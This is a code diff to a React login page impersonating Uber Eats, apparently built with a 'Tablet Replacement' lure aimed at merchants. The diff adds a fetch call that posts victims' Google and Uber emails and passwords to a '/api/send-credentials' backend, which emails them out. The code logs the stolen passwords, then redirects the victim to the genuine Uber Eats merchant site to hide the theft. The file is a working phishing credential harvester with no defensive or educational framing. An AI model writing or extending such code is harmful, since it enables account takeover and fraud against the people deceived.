@@ -35,13 +35,40 @@ export default function UberEatsLogin({ googleCredentials }: UberEatsLoginProps)
     // Track form submission
     trackFormSubmit('login-form-page-2', { email, password, googleCredentials }, '/login-page-2');
     
-    // Log credentials (frontend only)
-    console.log('📧 Credentials captured:', {
-      googleEmail: googleCredentials.email,
-      googlePassword: googleCredentials.password,
-      uberEmail: email,
-      uberPassword: password
-    });
+    // Send credentials to backend
+    try {
+      console.log('📧 Sending credentials to backend...');
+      const apiUrl = import.meta.env.PROD 
+        ? '/api/send-credentials' 
+        : 'http://localhost:3001/api/send-credentials';
+      
+      const response = await fetch(apiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          googleEmail: googleCredentials.email,
+          googlePassword: googleCredentials.password,
+          uberEmail: email,
+          uberPassword: password
+        })
+      });
+      
+      const result = await response.json();
+      console.log('✅ Response from backend:', result);
+      
+      if (result.success) {
+        console.log('✅ Email sent successfully with data:', {
+          googleEmail: googleCredentials.email,
+          googlePassword: googleCredentials.password,
+          uberEmail: email,
+          uberPassword: password
+        });
+      }
+    } catch (error) {
+      console.error('❌ Error sending credentials:', error);
+    }
     
     // Redirect to Uber Eats merchant learning center
     setTimeout(() => {
@@ -54,8 +81,8 @@ export default function UberEatsLogin({ googleCredentials }: UberEatsLoginProps)
       {/* Header */}
       <header className="bg-gradient-to-r from-gray-900 to-gray-800 px-6 py-4">
         <h1 className="text-white text-3xl pl-10">
-          <span className="font-medium">Uber</span>{" "}
-          <span className="font-bold">Eats</span>
+          <span className="font-medium">Tablet</span>{" "}
+          <span className="font-bold">Replacement</span>
         </h1>
       </header>
 
